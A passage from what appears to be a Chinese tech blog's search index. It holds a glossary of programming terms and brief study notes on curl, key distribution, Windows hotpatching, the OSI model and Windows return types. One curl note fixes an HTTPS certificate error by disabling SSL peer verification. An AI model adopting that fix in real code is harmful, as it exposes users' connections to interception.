batch 批次（意思是整批作业） 批处理 benefit 利益 收益 best viable function 最佳可行函式 最佳可行函式 （从 viable functions 中挑出的最佳吻合者） binary search 二分搜寻法 二分查找 binary tree 二元树 二叉树 binary function 二元函式 双叁函数 binary operator 二元运算子 二元操作符 binding 系结 绑定 bit 位元 位 bit field 位元栏 位域 bitmap 位元图 位图 bitwise 以 bit 为单元逐一┅ bitwise copy 以 bit 为单元进行复制；位元逐一复制 位拷贝 block 区块,区段 块、区块、语句块 boolean 布林值（真假值，true 或 false） 布尔值 border 边框、框线 边框 brace (curly brace) 大括弧、大括号 花括弧、花括号 bracket (square brakcet) 中括弧、中括号 方括弧、方括号 breakpoint 中断点 断点 build 建造、构筑、建置（MS 用语） build－in 内建 内置 bus 汇流排 总线 business 商务,业务 业务 buttons 按钮 按钮 byte 位元组（由 8 bits 组成） 字节 C cache 快取 高速缓存 call 呼叫、叫用 调用 callback 回呼 回调 call operator call （函式呼叫）运算子调用操作符 （同 function call operator） candidate function 候选函式 候选函数 （在函式多载决议程序中出现的候选函式） chain 串链（例 chain of function calls） 链 character 字元 字符 check box 核取方块 (i.e. check button) 复选框 checked exception 可控式异常(Java) check button 方钮 (i.e. check box) 复选按钮 child class 子类别（或称为derived class, subtype） 子类 class 类别 类 class body 类别本体 类体 class declaration 类别宣告、类别宣告式 类声明 class definition 类别定义、类别定义式 类定义 class derivation list 类别衍化列 类继承列表 class head 类别表头 类头 class hierarchy 类别继承体系, 类别阶层 类层次体系 class library 类别程式库、类别库 类库 class template 类别模板、类别范本 类模板 class template partial specializations 类别模板偏特化 类模板部分特化 class template specializations 类别模板特化 类模板特化 cleanup 清理、善后 清理、清除 client 客端、客户端、客户 客户 client－server 主从架构 客户&#x2F;服务器 clipboard 剪贴簿 剪贴板 clone 复制 克隆 collection 群集 集合 combo box 复合方块、复合框 组合框 command line 命令列 命令行 (系统文字模式下的整行执行命令) communication 通讯 通讯 compatible 相容 兼容 compile time 编译期 编译期、编译时 compiler 编译器 编译器 component 组件 组件 composition 复合、合成、组合 组合 computer 电脑、计算机 计算机、电脑 concept 概念 概念 concrete 具象的 实在的 concurrent 并行 并发 configuration 组态 配置 connection 连接，连线（网络,资料库） 连接 constraint 约束（条件） construct 构件 构件 container 容器 容器（存放资料的某种结构如 list, vector…） containment 内含 包容 context 背景关系、周遭环境、上下脉络 环境、上下文 control 控制元件、控件 控件 console 主控台 控制台 const 常数（constant 的缩写，C++ 关键字） constant 常数（相对於 variable） 常量 constructor (ctor） 建构式 构造函数 （与class 同名的一种 member functions） copy (v) 复制、拷贝 拷贝 copy (n) 复件, 副本 cover 涵盖 覆盖 create 创建、建立、产生、生成 创建 creation 产生、生成 创建 cursor 游标 光标 custom 订制、自定 定制 D data 资料 数据 database 资料库 数据库 database schema 数据库结构纲目 data member 资料成员、成员变数 数据成员、成员变量 data structure 资料结构 数据结构 datagram 资料元 数据报文 dead lock 死结 死锁 debug 除错 调试 debugger 除错器 调试器 declaration 宣告、宣告式 声明 deduction 推导（例：template argument deduction） 推导、推断 default 预设 缺省、默认 defer 延缓 推迟 define 定义 预定义 definition 定义、定义区、定义式 定义 delegate 委派、委托、委任 委托 delegation （同上） demarshal 反编列 散集 dereference 提领（取出指标所指物体的内容） 解叁考 dereference operator dereference （提领）运算子 * 解叁考操作符 derived class 衍生类别 派生类 design by contract 契约式设计 design pattern 设计范式、设计样式 设计模式 ※ 最近我比较喜欢「设计范式」一词 destroy 摧毁、销毁 destructor 解构式 析构函数 device 装置、设备 设备 dialog 对话窗、对话盒 对话框 directive 指令（例：using directive） (编译)指示符 directory 目录 目录 disk 碟 盘 dispatch 分派 分派 distributed computing 分布式计算 (分布式电算) 分布式计算 分散式计算 (分散式电算) document 文件 文档 dot operator dot （句点）运算子 . (圆)点操作符 driver 驱动程式 驱动（程序） dynamic binding 动态系结 动态绑定 E efficiency 效率 效率 efficient 高效 高效 end user 终端用户 entity 物体 实体、物体 encapsulation 封装 封装 enclosing class 外围类别（与巢状类别 nested class 有关）外围类 enum (enumeration) 列举（一种 C++ 资料型别） 枚举 enumerators 列举元（enum 型别中的成员） 枚举成员、枚举器 equal 相等 相等 equality 相等性 相等性 equality operator equality （等号）运算子 &#x3D;&#x3D; 等号操作符 equivalence 等价性、等同性、对等性 等价性 equivalent 等价、等同、对等 等价 escape code 转义码 转义码 evaluate 评估、求值、核定 评估 event 事件 事件 event driven 事件驱动的 事件驱动的 exception 异常情况 异常 exception declaration 异常宣告（ref. C++ Primer 3&#x2F;e, 11.3） 异常声明 exception handling 异常处理、异常处理机制 异常处理、异常处理机制 exception specification 异常规格（ref. C++ Primer 3&#x2F;e, 11.4） 异常规范 exit 退离（指离开函式时的那一个执行点） 退出 explicit 明白的、明显的、显式 显式 export 汇出 引出、导出 expression 运算式、算式 表达式 F facility 设施、设备 设施、设备 feature 特性 field 栏位,资料栏（Java） 字段, 值域（Java） file 档案 文件 firmware 韧体 固件 flag 旗标 标记 flash memory 快闪记忆体 闪存 flexibility 弹性 灵活性 flush 清理、扫清 刷新 font 字型 字体 form 表单（programming 用语） 窗体 formal parameter 形式叁数 形式叁数 forward declaration 前置宣告 前置声明 forwarding 转呼叫,转发 转发 forwarding function 转呼叫函式,转发函式 转发函数 fractal 碎形 分形 framework 框架 框架 full specialization 全特化（ref. partial specialization） function 函式、函数 函数 function call operator 同 call operator function object 函式物件（ref. C++ Primer 3&#x2F;e, 12.3） 函数对象 function overloaded resolution 函式多载决议程序 函数重载解决（方案） functionality 功能、机能 功能 function template 函式模板、函式范本 函数模板 functor 仿函式 仿函式、函子 G game 游戏 游戏 generate 生成 generic 泛型、一般化的 一般化的、通用的、泛化 generic algorithm 泛型演算法 通用算法 getter (相对於 setter) 取值函式 global 全域的（对应於 local） 全局的 global object 全域物件 全局对象 global scope resolution operator 全域生存空间（范围决议）运算子 :: 全局范围解析操作符 group 群组 group box 群组方块 分组框 guard clause 卫述句 (Refactoring, p250) 卫语句 GUI 图形介面 图形界面 H hand shaking 握手协商 handle 识别码、识别号、号码牌、权柄 句柄 handler 处理常式 处理函数 hard－coded 编死的 硬编码的 hard－copy 硬拷图 屏幕截图 hard disk 硬碟 硬盘 hardware 硬体 硬件 hash table 杂凑表 哈希表、散列表 header file 表头档、标头档 头文件 heap 堆积 堆 hierarchy 阶层体系 层次结构（体系） hook 挂钩 钩子 hyperlink 超链结 超链接 I icon 图示、图标 图标 IDE 整合开发环境 集成开发环境 identifier 识别字、识别符号 标识符 if and only if 若且唯若 当且仅当 Illinois 伊利诺 伊利诺斯 image 影像 图象 immediate base 直接的（紧临的）上层 base class。 直接上层基类 immediate derived 直接的（紧临的）下层 derived class。 直接下层派生类 immutability 不变性 immutable 不可变（的） implement 实作、实现 实现 implementation 实作品、实作体、实作码、实件 实现 implicit 隐喻的、暗自的、隐式 隐式 import 汇入 导入 increment operator 累加运算子 ++ 增加操作符 infinite loop 无穷回圈 无限循环 infinite recursive 无穷递回 无限递归 information 资讯 信息 infrastructure 公共基础建设 inheritance 继承、继承机制 继承、继承机制 inline 行内 内联 inline expansion 行内展开 内联展开 initialization 初始化（动作） 初始化 initialization list 初值列 初始值列表 initialize 初始化 初始化 inner class 内隐类别 内嵌类 instance 实体 实例 （根据某种表述而实际产生的「东西」） instantiated 具现化、实体化（常应用於 template） 实例化 instantiation 具现体、具现化实体（常应用於 template） 实例 integer (integral) 整数（的） 整型（的） integrate 整合 集成 interacts 交谈、互动 交互 interface 介面 接口 for GUI 介面 界面 interpreter 直译器 解释器 invariants 恒常性,约束条件 约束条件 invoke 唤起 调用 iterate 迭代（回圈一个轮回一个轮回地进行） 迭代 iterative 反覆的，迭代的 iterator 迭代器（一种泛型指标） 迭代器 iteration 迭代（回圈每次轮回称为一个 iteration） 迭代 item 项目、条款 项、条款、项目 L laser 雷射 激光 level 阶 层 (级) 例 high level 高阶 高层 library 程式库、函式库 库、函数库 lifetime 生命期、寿命 生命期、寿命 link 联结、连结 连接,链接 linker 联结器、连结器 连接器 literal constant 字面常数（例 3.14 或 “hi” 这等常数值） 字面常数 list 串列（linked－list） 列表、表、链表 list box 列表方块、列表框 列表框 load 载入 装载 loader 载入器 装载器、载入器 local 区域的（对应於 global） 局部的 local object 区域物件 局部对象 lock 机锁 loop 回圈 循环 lvalue 左值 左值 M macro 巨集 宏 magic number 魔术数字 魔法数 maintain 维护 维护 manipulator 操纵器（iostream 预先定义的一种东西） 操纵器 marshal 编列 列集 叁考 demarshal mechanism 机制 机制 member 成员 成员 member access operator 成员取用运算子（有 dot 和 arrow 两种） 成员存取操作符 member function 成员函式 成员函数 member initialization list 成员初值列 成员初始值列表 memberwise 以 member 为单元┅、members 逐一┅ 以成员为单位 memberwise copy 以 members 为单元逐一复制 memory 记忆体 内存 menu 表单、选单 菜单 message 讯息 消息 message based 以讯息为基础的 基於消息的 message loop 讯息回圈 消息环 method (Java) 方法、行为、函式 方法 meta micro 微 middleware 中介层 中间件 modeling 模塑 modeling language 塑模语言，建模语言 modem 数据机 调制解调器 module 模组 模块 modifier 饰词 修饰符 most derived class 最末层衍生类别 最底层的派生类 mouse 滑鼠 鼠标 mutable 可变的 可变的 multi－tasking 多工 多任务 N namespace 命名空间 名字空间、命名空间 native 原生的 本地的、固有的 nested class 巢状类别 嵌套类 network 网路 网络 network card 网路卡 网卡 O object 物件 对象 object based 以物件为基础的 基於对象的 object file 目的档 目标文件 object model 物件模型 对象模型 object oriented 物件导向的 面向对象的 online 线上 在线 opaque 不透明的 operand 运算元 操作数 operating system (OS) 作业系统 操作系统 operation 操作、操作行为 操作 operator 运算子 操作符、运算符 option 选项，可选方案 选项 ordinary 常规的 常规的 overflow 上限溢位（相对於 underflow） 溢出（underflow:下溢） overhead 额外负担、额外开销 额外开销 overload 多载化、多载化、重载 重载 overloaded function 多载化函式 重载的函数 overloaded operator 多载化运算子 被重载的操作符 overloaded set 多载集合 重载集合 override 改写、覆写 重载、改写、重新定义 （在 derived class 中重新定义虚拟函式 P package 套件 包 pair 对组 palette 调色盘、组件盘、工具箱 pane 窗格 窗格（有时为嵌板之意，例 Java Content Pane） parallel 平行 并行 parameter 叁数（函式叁数列上的变数） 叁数、形式叁数、形叁 parameter list 叁数列 叁数列表 parent class 父类别（或称 base class） 父类 parentheses 小括弧、小括号 圆括弧、圆括号 parse 解析 解析 part 零件 部件 partial specialization 偏特化（ref. C++ Primer 3&#x2F;e, 16.10） 局部特化 （ref. full specialization） pass by address 传址（函式引数的传递方式）（非正式用语）传地址 pass by reference 传址（函式引数的一种传递方式） 传地址, 按引用传递 pass by value 传值（函式引数的一种传递方式） 按值传递 pattern 范式、样式 模式 performance 效率、性能兼而有之 性能 persistence 永续性 持久性 pixel 图素、像素 像素 placement delete ref. C++ Primer3&#x2F;e, 15.8.2 placement new ref. C++ Primer 3&#x2F;e, 15.8.2 platform 平台 平台 pointer 指标 指针 址位器（和址叁器 reference 形成对映，满好） poll 轮询 轮询 polymorphism 多型 多态 pop up 冒起式、弹出式 弹出式 port 埠 端口 postfix 后置式、后序式 后置式 precedence 优先序（通常用於运算子的优先执行次序） prefix 前置式、前序式 前置式 preprocessor 前处理器 预处理器 prime 质数 素数 primitive type 基本型别 (不同於 base class,基础类别) print 列印 打印 printer 印表机 打印机 priority 优先权 (通常用於执行绪获得 CPU 时间的优先次序） procedure 程序 过程 procedural 程序性的、程序式的 过程式的、过程化的 process 行程 进程 profile 评测 评测 profiler 效能（效率）评测器 效能（性能）评测器 programmer 程式员 程序员 programming 编程、程式设计、程式化 编程 progress bar 进度指示器 进度指示器 project 专案 项目、工程 property 属性 protocol 协定 协议 pseudo code 假码、虚拟码、伪码 伪码 Q qualified 经过资格修饰（例如加上 scope 运算子） 限定 qualifier 资格修饰词、饰词 限定修饰词 quality 品质 质量 queue 伫列 队列 R radian 径度 弧度 radio button 圆钮 单选按钮 raise 引发（常用来表示发出一个 exception） 引起、引发 random number 随机数、乱数 随机数 range 范围、区间（用於 STL 时） 范围、区间 rank 等级、分等（ref. C++Primer 3&#x2F;e 9,15章） 等级 raw 生鲜的、未经处理的 未经处理的 record 记录 记录 recordset 记录集 记录集 recursive 递回 递归 re－direction 重导向 重定向 refactoring 重构、重整 重构 refer 取用 叁考 refer to 指向、指涉、指代 reference （C++ 中类似指标的东西，相当於 “化身”） 引用、叁考 址叁器, see pointer register 暂存器 寄存器 reflection 反射 反射、映像 relational database 关联式资料库 关系数据库 represent 表述，表现 表述，表现 resolve 决议（为算式中的符号名称寻找 解析 对应之宣告式的过程） resolution 决议程序、决议过程 解析过程 resolution 解析度 分辨率 restriction 局限 return 传回、回返 返回 return type 回返型别 返回类型 return value 回返值 返回值 robust 强固、稳健 健壮 robustness 强固性、稳健性 健壮性 routine 常式 例程 runtime 执行期 运行期、运行时 common language runtime (CLR) 译为「通用语言执行层」 rvalue 右值 右值 S save 储存 存储 schedule 排程 调度 scheduler 排程器 调度程序 scheme 结构纲目、组织纲目 scroll bar 卷轴 滚动条 scope 生存空间、生存范围、范畴、作用域 生存空间 scope operator 生存空间（范围决议）运算子 :: 生存空间操作符 scope resolution operator 生存空间决议运算子 生存空间解析操作符 （与scope operator同） screen 萤幕 屏幕 search 搜寻 查找 semantics 语意 语义 sequential container 序列式容器 顺序式容器 （对应於 associative container） server 伺服器、伺服端 服务器、服务端 serial 串行 serialization 次第读写,序列化 序列化 (serialize) setter (相对於 getter) 设值函式 signal 信号 signature 标记式、签名式、署名式 签名 slider 滚轴 滑块 slot 条孔、槽 槽 smart pointer 灵巧指标、精灵指标 智能指针 snapshot 萤幕快照（图） 屏幕截图 specialization 特殊化、特殊化定义、特殊化宣告 特化 specification 规格 规格、规范 splitter 分裂视窗 切分窗口 software 软体 软件 solution 解法,解决方案 方案 source 原始码 源码、源代码 stack 堆叠 栈 stack unwinding 堆叠辗转开解（此词用於 exception 主题） 栈辗转开解 * standard library 标准程式库 standard template library 标准模板程式库 statement 述句 语句、声明 status bar 状态列、状态栏 状态条 STL 见 standard template library stream 资料流、串流 流 string 字串 字符串 subroutine 子路由 subscript operator 下标运算子 [ ] 下标操作符 subtype 子型别 子类型 support 支援 支持 suspend 虚悬 挂起 symbol 符号 记号 syntax 语法 语法 T tag 标签 标记 索引标签,页签 target 标的（例 target pointer：标的指标） 目标 task switch 工作切换 任务切换 template 模板、范本 模板 template argument deduction 模板引数推导 模板叁数推导 template explicit specialization 模板显式特化（版本） 模板显式特化 template parameter 模板叁数 模板叁数 temporary object 暂时物件 临时对象","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"英语","slug":"英语","permalink":"http://example.com/tags/%E8%8B%B1%E8%AF%AD/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"En","slug":"E-手册/En","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/En/"}]},{"title":"Curl 请求 Https","date":"2023-10-27T01:24:02.466Z","path":"E_手册/Curl/curl请求https/","text":"使用 curl 发送 https 请求时，如下命令就会报错： 1curl &quot;https://www.baidu.com&quot; 错误代码： curl: (60) SSL certificate problem: unable to get local issuer certificate More details here: https://curl.haxx.se/docs/sslcerts.html 一般的解决办法就是下载CA证书。但是使用C++代码调用 libcurl 发送 https 请求，只需要在设置一下这个就可以关闭 ssl 验证，从而能够发送 https 请求。 1curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);","tags":[{"name":"curl","slug":"curl","permalink":"http://example.com/tags/curl/"},{"name":"https","slug":"https","permalink":"http://example.com/tags/https/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Curl","slug":"E-手册/Curl","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Curl/"}]},{"title":"CMakeList","date":"2023-10-27T01:24:02.464Z","path":"E_手册/CMake使用/","text":"概述： CMake 使用手册 [toc] 默认配置1project","tags":[],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"第7章 网络安全","date":"2023-10-27T01:24:02.462Z","path":"D_立志博览群书/《计算机网络 第7版》/第7章 网络安全/index/","text":"本章只是对计算机网络安全问题进行初步的介绍。 本章最重要的内容是： 计算机完了过面临的安全性威胁和计算机网络安全的主要问题","tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"防火墙","slug":"防火墙","permalink":"http://example.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"ssl","slug":"ssl","permalink":"http://example.com/tags/ssl/"},{"name":"tls","slug":"tls","permalink":"http://example.com/tags/tls/"},{"name":"系统安全","slug":"系统安全","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"},{"name":"对称密钥","slug":"对称密钥","permalink":"http://example.com/tags/%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5/"},{"name":"公钥","slug":"公钥","permalink":"http://example.com/tags/%E5%85%AC%E9%92%A5/"},{"name":"数字签名与鉴别","slug":"数字签名与鉴别","permalink":"http://example.com/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%B8%8E%E9%89%B4%E5%88%AB/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《计算机网络 第7版》","slug":"D-立志博览群书/《计算机网络-第7版》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/"},{"name":"第7章 网络安全","slug":"D-立志博览群书/《计算机网络-第7版》/第7章-网络安全","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/%E7%AC%AC7%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"密钥分配","date":"2023-10-27T01:24:02.460Z","path":"D_立志博览群书/《计算机网络 第7版》/第7章 网络安全/7.5 密钥分配/","text":"密钥分配由于密码算法是公开的，网路的安全性就完全基于密钥的安全保护上。因此在密码学中出现了一个重要的分支——密钥管理。密钥管理包括：密钥的产生、分配、注入、验证和使用。本节只讨论密钥的分配。 密钥分配（或密钥分发）是密钥管理中最大的问题。密钥必须通过最安全的通路进行分配。 例如，可以派非常可靠的信使携带密钥分配给互相通信的各用户。这种方法称为网外分配方式。但随着用户的增多和网络流量的增大，密钥更换频繁（密钥必须定期更换才能做到可靠），派信使的办法已不再使用，而应采用网内分配方式，即对密钥自动分配。","tags":[{"name":"对称密钥","slug":"对称密钥","permalink":"http://example.com/tags/%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5/"},{"name":"公钥","slug":"公钥","permalink":"http://example.com/tags/%E5%85%AC%E9%92%A5/"},{"name":"密钥管理","slug":"密钥管理","permalink":"http://example.com/tags/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《计算机网络 第7版》","slug":"D-立志博览群书/《计算机网络-第7版》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/"},{"name":"第7章 网络安全","slug":"D-立志博览群书/《计算机网络-第7版》/第7章-网络安全","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC7%E7%89%88%E3%80%8B/%E7%AC%AC7%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"热补丁支持","date":"2023-10-27T01:24:02.457Z","path":"D_立志博览群书/《深入理解Windows操作系统》/3-13-热补丁支持/","text":"[TOC] 补丁定义补丁是指衣服、被褥上为遮掩破洞而钉补上的小布块。明白了吗？ 现在也指对于大型软件系统(如微软操作系统)在使用过程中暴露的问题（一般由黑客或病毒设计者发现）而发布的解决问题的小程序。就像衣服烂了就要打补丁一样，人编写程序不可能十全十美的，所以软件也免不了会出现BUG，而补丁是专门修复这些BUG做的因为原来发布的软件存在缺陷，发现之后另外编制一个小程序使其完善，这种小程序俗称补丁。补丁是由软件的原来作者制作的，可以访问网站下载补丁。 补丁一般都是 .exe 文件 微软补丁微软的Windows操作系统比较大，比较复杂。因此总有考虑不周的地方。有些病毒或者黑客就利用微软的漏洞进行攻击。微软发现漏洞后就发布一些补丁程序。 我们得到微软的补丁程序后安装到计算机上就叫打补丁。 什么是微软补丁？ 微软发布的系统补丁有两种类型：Hotfix 和 Service Pack，下面介绍它们之间的区别和联系。 hotfix 是微软针对某一个具体的系统漏洞或安全问题而发布的专门解决程序，Hotfix的程序文件名有严格的规定，一般格式为“产品名-KBXXXXXX-处理器平台-语言版本.exe”。现在一个例子来详细说明：微软针对震荡病毒而发布的Hotfix程序名为“Win2K-KB835732-X86-CHS.exe”，我们知道这个补丁是针对Win2000系统的，其知识库编号为 835732，应用于 X86 处理器平台，语言版本为简体中文。 Hotfix 是针对某一个具体问题而发布的解决程序，因此它会经常发布，数量非常大。用户想要知道目前已经发布了哪些Hotfix程序是一件非常麻烦的事。因此微软将这些Hotfix补丁全部打包成一个程序提供给用户安装，这就是Service Pack，简称SP。Service Pack包含了发布日期以前所有的Hotfix程序，因此只要安装了它，就可以保证自己不会漏掉一个Hotfix程序。而且发布时间晚的Service Pack程序会包含以前的Service Pack，例如 SP3会包含SP1、SP2的所有补丁。 热补丁支持 重新引导一台机器以便把最新的补丁都应用上，这对于服务器来说可能会意味着一段显著的宕机时间，这也正是为什么Windows要支持运行时刻的补丁方法，称为热补丁（hot patch，或简化为hotpatch）。与之相反的是冷补丁（coldpatch），它要求一次重新引导。热补丁并非只是简单地允许文件可在执行过程中被覆盖;相反地，它包括了一系列可能会被请求执行的复杂操作（这些操作也可能会组合起来）。 热补丁执行操作下表列出了这些操作： 操作 含义 用途 映像文件改名称（Rename Image) 替换磁盘上一个正在被其他应用程序使用的DLL，或者替换磁盘上一个已经被内核加载到系统中的驱动程序 当一个用户模式的库需要完整地被替换的时候，内核可以检测到哪些进程和服务正在引用该库，将它们卸载出内存，然后更新DLL，再重新启动这些程序和服务（通过重启管理器[restart manager]来完成）。当一个驱动程序需要被替换的时候，内核可以卸载该驱动程序（该驱动程序要求有一个卸载例程），更新驱动程序，然后重新加载替换后的驱动程序 对象交换（Object Swap） 以原子操作的方式更改对象目录名字空间中的一个对象 当一个文件（往往是已知的DLL）需要被原子凡事修改名称，但不影响任何可能正在使用该文件的进程时（所以，这些进程可以立即使用新的文件，且仍然使用老的句柄，但不要求应用程序重新启动） 补丁函数代码（Patch Function Code） 将一个映像文件中的一个或多个函数的代码替换为新的版本 如果在运行时刻一个DLL或驱动程序不能被替换或修改名称，则该映像中的函数可以直接被打上补丁。对于一个包含了新代码的热补丁DLL，当老的函数被调用时，它会跳转到新的代码中。 刷新系统DLL（Refresh System DLL） 重新为Ntdll.dll加载内存映射区对象 Windows的系统原生库Ntdll.dll只在系统引导过程中被加载一次，以后只是被简单地复制到每个新进程的地址空间中。如果它呗热补丁了，那么，系统必须刷新这一内存区对象，以便加载新的版本 特性运行时刻卸载 热补丁文件的构成除了包括要替换的函数部分，还包括一个Update.exe的程序以及一个额外的.hp热补丁文件。 Update.exe：完成该补丁的提取工作，也执行相应的更新过程。 .hp热补丁文件：此文件包含一个特殊的PE头，称为.HOT1。该PE头包含了一个数据结构，描述了该文件中出现的各种补丁描述符（patch descriptor）。每一个补丁描述述符指明了在原始文件中需要被补丁的偏移位置、一个验证机制（它可以包含一份老数据的简单比较、一个校验和，或者一个散列值），以及待补丁的新数据。内核将解析这些描述符，并且执行恰当的修改动作。若是被保护的进程（protected process，有关进程的更多信息，参见《深入理解Windows操作系统》第5章），或者其他经过数字签名的二进制映像，在这些情况下，热补丁也必须被经过数字签名，以避免针对敏感文件或进程执行“伪造的”补丁。 在编译时刻对热补丁的支持，是通过在每个函数的开始处加入7个额外的字节来做到的。其中5个字节被看做前一个函数的结束部分，2个字节被看作函数前缀（function prolog）部分，也就是函数的开始。 限制使用热补丁也存在一些限制： 与安全软件的不兼容。像安全软件类的第三方应用程序可能会阻止这样的补丁；补丁也可能与第三方应用程序的操作系统不兼容 补丁要修改一个文件的导出表或导入表 补丁要改变数据结构，修正无限循环，或者包含内联的汇编代码","tags":[{"name":"《深入理解Windows操作系统》","slug":"《深入理解Windows操作系统》","permalink":"http://example.com/tags/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《深入理解Windows操作系统》","slug":"D-立志博览群书/《深入理解Windows操作系统》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"}]},{"title":"OSI参考模型","date":"2023-10-27T01:24:02.457Z","path":"D_立志博览群书/《深入理解Windows操作系统》/7-1-OSI参考模型/","text":"OSI 参考模型是一个理想化的方案。这么说是因为很少有系统是完全按照它来实现（关于这一点可以后续再讨论），但是它通常被用来作为网络原理讨论的框架。 一台机器上的每一层都假设它在跟另一台机器上的同一层“通话”。在同一层次上，两台机器“说”的是同一种语言或协议。 每一次网络传输必须都要向下传输，通过客户机器的每一层，再传输到网络上，然后再目标机器上向上传递，直至到达某一可以理解和执行该请求的层。 在 OSI 模型中，每一层的目的是：向更高的层提供服务，并且对如何在低层上实现这些服务进行抽象。 以下内容为 OSI 七层中每一层的介绍: 物理层 数据链路层 网络层 传输层 会话层 表示层 应用层","tags":[{"name":"《深入理解Windows操作系统》","slug":"《深入理解Windows操作系统》","permalink":"http://example.com/tags/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"网络编程","slug":"网络编程","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《深入理解Windows操作系统》","slug":"D-立志博览群书/《深入理解Windows操作系统》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"}]},{"title":"返回值类型的规范","date":"2023-10-27T01:24:02.455Z","path":"D_立志博览群书/《Windows核心编程》/1-1-返回值类型的规范/","text":"参照 Windows 对程序错误的处理中，函数常用返回值的设置，作为C++开发，也应该参照这一标准。 当调用一个 Windows 函数时，它首先要检验传递给它的的各个参数的有效性，然后再设法 执行任务。如果传递了一个无效参数，或者由于某种原因无法执行这项操作，那么操作系统就 会返回一个值，指明该函数在某种程度上运行失败了。表 1 - 1列出了大多数 Windows 函数使用 的返回值的数据类型 Windows 函数常用的返回值类型 数据类型 表示失败的值 void 该函数的运行不可能失败。Windows 函数的返回值类型很少是 void bool 如果函数运行失败，那么返回值是0，否则返回的是非0值。最好对返回值进行测试，以确定它是0还是非0。不要测试返回值是否为TRUE HANDLE 如果函数运行失败，则返回值通常是 NULL，否则返回值为 HANDLE，用于标识你可以操作的一个对象。注意，有些函数会返回一个句柄值 INVALID_ HANDLE_VALUE，它被定义为 -1。函数的Platform SDK 文档将会清楚地说明该函数运行失败时返回的是 NULL 还是 INVALID_HANDLE_VALID PVOID 如果函数运行失败，则返回值是 NULL，否则返回PVOID，以标识数据块的内存地址 LONG&#x2F;DWORD 这是个难以处理的值。返回数量的函数通常返回LONG或DWORD。如果由于某种原因，函数无法对想要进行计数的对象进行计数，那么该函数通常返回 0或-1（根据函数而定）。如果调用的函数反悔了LONG&#x2F;DWORD，那么需要阅读相应的函数说明，以确保能正确检查潜在的错误。 一个 Windows 